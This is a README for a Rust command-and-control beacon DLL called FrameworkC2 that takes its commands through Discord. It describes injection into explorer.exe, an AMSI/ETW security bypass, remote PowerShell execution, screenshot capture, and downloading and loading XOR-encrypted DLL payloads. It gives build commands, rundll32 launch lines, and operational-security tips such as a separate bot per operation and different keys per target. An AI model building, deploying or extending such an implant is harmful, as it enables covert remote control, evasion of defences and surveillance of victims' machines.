# Beacon Rust - Discord C2 DLL

Discord-based beacon DLL for the FrameworkC2 project.

## Features

- Auto-starts on DllMain (spawns worker thread)
- Discord REST API communication
- AMSI/ETW bypass (hardware breakpoints)
- Dynamic PE loading for additional modules

## Commands

| Command | Description |
|---------|-------------|
| `shell <cmd>` | Execute PowerShell command |
| `scr` | Screenshot all monitors |
| `!loaddll [name]` | Load attached DLL (XOR encrypted) |
| `help` | Show available commands |

## Configuration

Edit `config.toml` before building:

```toml
[discord]
api_url = "https://discord.com/api/v10"
bot_token = "YOUR_BOT_TOKEN_HERE"
guild_id = "YOUR_GUILD_ID_HERE"
general_channel_id = "YOUR_CHANNEL_ID_HERE"

[settings]
poll_interval_secs = 5

[crypto]
xor_key = "41"  # Hex string for XOR decryption
```

## Building

```bash
# From FrameworkC2 root
cargo build --release --target x86_64-pc-windows-gnu --package beacon

# Output: target/x86_64-pc-windows-gnu/release/beacon.dll
```

## Usage

### Via Loader (Recommended)

The loader injects beacon.dll into explorer.exe. The beacon:
1. Auto-starts in a new thread
2. Runs AMSI/ETW bypass
3. Connects to Discord
4. Creates a channel named after the hostname
5. Starts polling for commands

### Via rundll32 (Testing)

```cmd
rundll32.exe beacon.dll,Start
rundll32.exe beacon.dll,Run
```

## Loading Additional DLLs

The `!loaddll` command allows loading arbitrary DLLs at runtime:

1. Encrypt DLL with XOR:
   ```bash
   python3 ../tools/xor_encrypt.py payload.dll payload.dll.enc 41
   ```

2. In Discord channel, attach `payload.dll.enc` and send:
   ```
   !loaddll
   ```

3. The beacon downloads, decrypts, and loads the DLL using the PE loader.

## Architecture

```
DllMain (DLL_PROCESS_ATTACH)
    │
    └─▶ spawn thread
            │
            ├─▶ setup_bypass()     # AMSI/ETW
            │
            ├─▶ Config::load()     # Read embedded config
            │
            ├─▶ DiscordClient      # Connect to Discord
            │       │
            │       ├─▶ validate_token()
            │       ├─▶ get_or_create_channel()
            │       ├─▶ notify_connection()
            │       │
            │       └─▶ polling_loop()
            │               │
            │               ├─▶ get_latest_message()
            │               ├─▶ process_command()
            │               │       │
            │               │       ├─▶ Shell → execute_shell_command()
            │               │       ├─▶ Screenshot → capture_screenshot()
            │               │       ├─▶ LoadDll → handle_loaddll()
            │               │       │       │
            │               │       │       ├─▶ download_file()
            │               │       │       ├─▶ xor_decrypt()
            │               │       │       └─▶ load_dll_from_bytes()
            │               │       │               │
            │               │       │               └─▶ PeLoader::load()
            │               │       │
            │               │       └─▶ Help → get_help_message()
            │               │
            │               └─▶ send_command_result()
            │
            └─▶ (loop forever or until error)
```

## Dependencies

- `c2_common` - PE loader and syscalls
- `reqwest` - HTTP client (blocking, rustls)
- `image` - Screenshot encoding
- `xcap` - Screen capture (Windows)
- `winapi/ntapi` - Windows API types

## Security Considerations

1. **Bot Token**: The token is embedded in the DLL. Consider:
   - Using a dedicated bot per operation
   - Rotating tokens
   - Server-side token storage

2. **Encryption**: XOR is simple but weak. Consider:
   - AES encryption for payloads
   - Different keys per target

3. **Indicators**:
   - Discord API traffic
   - DLL size (~2.2 MB)
   - Rust runtime artifacts

## Files

```
beacon_rust/
├── Cargo.toml           # Dependencies
├── config.toml          # Embedded config template
├── README.md            # This file
└── src/
    ├── lib.rs           # DllMain, exports
    ├── config.rs        # Config loading
    ├── error.rs         # Error types
    ├── bypass.rs        # AMSI/ETW bypass
    ├── discord/
    │   ├── mod.rs
    │   ├── client.rs    # Discord API client
    │   └── models.rs    # Data structures
    └── commands/
        ├── mod.rs
        ├── models.rs    # Command enum
        ├── shell.rs     # PowerShell execution
        ├── screenshot.rs # Screenshot capture
        └── loaddll.rs   # PE loader integration
```
